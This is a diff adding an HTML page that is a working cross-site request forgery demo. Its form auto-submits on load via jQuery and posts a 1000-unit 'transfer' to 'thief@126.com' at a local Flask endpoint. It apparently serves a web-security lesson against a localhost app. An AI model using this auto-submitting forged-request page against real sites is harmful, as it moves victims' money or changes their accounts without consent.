@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="{{ url_for('static', filename='jquery.min.js') }}"></script>
+    <script>
+        $(function () {
+            $('form').submit();
+        });
+    </script>
+</head>
+<body>
+    <form action="http://localhost:5000/transfer/" method="post">
+    <table>
+        <tr>
+            <td><input type="text" name="email" value="thief@126.com"></td>
+        </tr>
+        <tr>
+            <td><input type="text" name="money" value="1000"></td>
+        </tr>
+        <tr>
+        </tr>
+    </table>
+
+</form>
+</body>
+</html>
